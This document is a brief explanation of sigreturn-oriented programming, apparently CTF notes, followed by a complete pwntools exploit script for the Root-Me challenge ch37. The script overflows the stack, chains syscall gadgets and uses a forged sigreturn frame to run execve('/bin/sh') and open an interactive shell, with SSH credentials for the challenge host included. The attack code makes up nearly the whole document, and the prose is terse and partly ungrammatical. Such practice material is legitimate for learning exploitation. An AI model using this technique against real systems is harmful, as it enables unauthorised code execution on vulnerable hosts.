
# Sigreturn

After a call to sigreturn, the sigreturn signal is send, the kernel puts on the stack the current context and calls the signal handler. It then returns the execution with the saved context.
We can put the context ourself in the stack to get the process control flow.


```python
srop_frame = SigreturnFrame()
srop_frame.rax = constants.SYS_execve
srop_frame.rdi = motivation_letter
srop_frame.rsi = 0
srop_frame.rdx = 0
srop_frame.rip = syscall

# SYS_SIGRETURN (rax=0xf)
rop2 = b"/bin/sh\x00"
rop2 += p64(xor_rax_inc_al)
rop2 += p64(inc_al) * 0xe
rop2 += p64(syscall)
rop2 += bytes(srop_frame)
```

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import os

exe = ELF('./ch37')

#exe = ELF('/challenge/app-systeme/ch37/ch37')
#context.terminal = ['tmux']

def start(argv=[], *a, **kw):
'''Start the exploit against the target.'''
if args.GDB:
return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, stdin=PTY)
elif args.SSH:
global s
s = ssh(user='app-systeme-ch37', host='challenge03.root-me.org', port=2223, password='app-systeme-ch37')
#s.upload("./What's your name : ", "/tmp/q/What's your name : ") # Have to chmod +x from ssh
return s.process(["/challenge/app-systeme/ch37/ch37"], cwd='/tmp/q')
elif args.GDB_SSH:
p = ssh(user='app-systeme-ch37', host='challenge03.root-me.org', port=2223, password='app-systeme-ch37')
return gdb.debug(["./ch37"], ssh=p, gdbscript=gdbscript)
else:
return process([exe.path] + argv, *a, **kw, stdin=PTY)

gdbscript = '''
b *0x400182
set follow-fork-mode child
c
'''.format(**locals())

def find_offset(io):
io.sendline(cyclic(0x100))
io.wait()

pid = io.__getattr__('pid')
corefile = f'{exe.path}.{pid}'
core = Coredump(corefile)
os.remove(corefile)

io.close()
return cyclic_find(core.fault_addr) #cyclic_find(core.rip/eip)

#===========================================================

# EXPLOIT GOES HERE

#===========================================================

write_no_rdx = 0x400163
syscall = 0x4000ff
main = 0x400102
ret = 0x400101
hello_str = 0x600197
_read = 0x400135
main_no_sub = 0x400106

# find offset
#io = process([exe.path])

#io.readuntil(b'name : ')
offset = 15 #find_offset(io)
print(f'Offset = {hex(offset)}')

io = start()

context.clear()
context.arch = "amd64"

#srop
srop_frame = SigreturnFrame()
srop_frame.rax = constants.SYS_execve
srop_frame.rdi = hello_str
srop_frame.rsi = 0
srop_frame.rdx = 0
srop_frame.rip = syscall

# SYS_SIGRETURN (rax=0xf)
srop1 = bytes(srop_frame)

print(srop_frame)

print(hex(len(srop1)))

print(io.readuntil(b'name : '))
io.sendline(cyclic(offset) + p64(main) + cyclic(0x18) + srop1)

print(io.readuntil(b'name : '))
payload = cyclic(offset) + p64(syscall) + p64(syscall) + p64(syscall)
print(hex(len(payload)))
io.sendline(payload)

sleep(0.2)
io.sendline(cyclic(0xf-2) + b'\4')

io.interactive()

if args.SSH:
s.download("/tmp/flag")
```